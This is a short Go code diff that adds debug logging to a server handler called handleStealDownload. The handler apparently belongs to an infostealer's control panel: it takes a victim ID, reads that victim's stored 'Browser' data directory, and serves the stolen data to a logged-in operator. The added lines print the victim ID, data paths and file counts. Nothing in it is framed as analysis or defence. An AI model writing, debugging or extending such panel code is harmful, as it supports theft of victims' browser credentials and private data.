@@ -65,6 +65,7 @@ func (s *Server) handleStealDownload(w http.ResponseWriter, r *http.Request) {
 	}
 
 	victimID := strings.TrimSpace(r.URL.Query().Get("victim_id"))
+	fmt.Printf("[steal-download] login=%s victimID=%s\n", login, victimID)
 	if victimID == "" {
 		http.Error(w, "missing victim_id", http.StatusBadRequest)
 		return
@@ -80,8 +81,10 @@ func (s *Server) handleStealDownload(w http.ResponseWriter, r *http.Request) {
 
 	dir := stealstore.DataDir(victimID)
 	browserDir := filepath.Join(dir, "Browser")
+	fmt.Printf("[steal-download] dir=%s browserDir=%s\n", dir, browserDir)
 
 	entries, err := os.ReadDir(browserDir)
+	fmt.Printf("[steal-download] entries=%d err=%v\n", len(entries), err)
 	if err != nil || len(entries) == 0 {
 		http.Error(w, "no steal data", http.StatusNotFound)
 		return
